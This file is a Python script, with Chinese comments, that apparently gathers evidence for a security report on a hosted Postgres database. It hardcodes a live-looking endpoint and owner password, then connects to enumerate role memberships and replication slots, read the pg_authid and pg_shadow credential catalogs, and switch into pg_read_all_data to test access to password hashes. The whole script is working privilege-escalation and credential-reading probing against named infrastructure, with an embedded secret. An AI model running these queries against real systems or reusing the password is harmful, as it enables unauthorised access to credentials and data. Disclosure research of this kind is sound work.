# -*- coding: utf-8 -*-
"""第五轮:成员关系全图 + 复现槽位 + 写权限复核(为报告精确取证)"""
import sys, psycopg
sys.path.insert(0, r'D:\scan\netlify_report')

EP_A = 'ep-autumn-cherry-ay51mbqz.c-5.us-east-2.db.netlify.com'
PW_OWN = 'npg_MtTpnyk2LE4j'


def run(user, pw, statements, db='netlifydb'):
    try:
        with psycopg.connect(host=EP_A, port=5432, dbname=db, user=user, password=pw,
                             sslmode='require', connect_timeout=15, autocommit=True) as c:
            with c.cursor() as cur:
                out = []
                for s in statements:
                    try:
                        cur.execute(s)
                        if cur.description:
                            out.append((s[:70], 'ROWS', str(cur.fetchall())[:600]))
                        else:
                            out.append((s[:70], 'OK', cur.statusmessage or ''))
                    except Exception as e:
                        out.append((s[:70], 'ERR', str(e)[:300]))
                        try:
                            c.rollback()
                        except Exception:
                            pass
        return out
    except Exception as e:
        return [('CONNECT', 'ERR', str(e)[:300])]


def pr(tag, rows):
    for s, k, m in rows:
        print('%-30s [%s] %s' % (tag + s, k, m.replace('\n', ' ')[:560]))
    print()


print('==== 成员关系全图 ====')
pr('| ', run('netlifydb_owner', PW_OWN, [
    "select roleid::regrole::text as role, member::regrole::text as member_of "
    "from pg_auth_members order by 1, 2",
    "select pg_has_role('pg_read_all_data','cloud_admin','member') as rad_member_of_ca, "
    "pg_has_role('neon_superuser','cloud_admin','member') as ns_member_of_ca, "
    "pg_has_role('pg_read_all_data','neon_superuser','member') as rad_member_of_ns, "
    "pg_has_role('netlifydb_owner','pg_read_all_data','member') as owner_member_of_rad, "
    "pg_has_role('neon_service','pg_read_all_data','member') as nsvc_member_of_rad",
]))

print('==== 复制槽与活动 ====')
pr('| ', run('netlifydb_owner', PW_OWN, [
    "select slot_name, slot_type, database, active, restart_lsn is not null as has_lsn "
    "from pg_replication_slots",
    "select rolname, rolpassword is not null as has_pw, rolsuper, rolcanlogin from pg_authid "
    "where rolpassword is not null or rolsuper order by 1",
]))

print('==== 读权限最终取证(owner / 各角色对照汇总) ====')
pr('| ', run('netlifydb_owner', PW_OWN, [
    "select count(*) from pg_authid",  # owner baseline
    "select count(*) from pg_shadow",
    "set role pg_read_all_data",
    "select current_user, count(*) from pg_authid group by current_user",
    "reset role",
]))
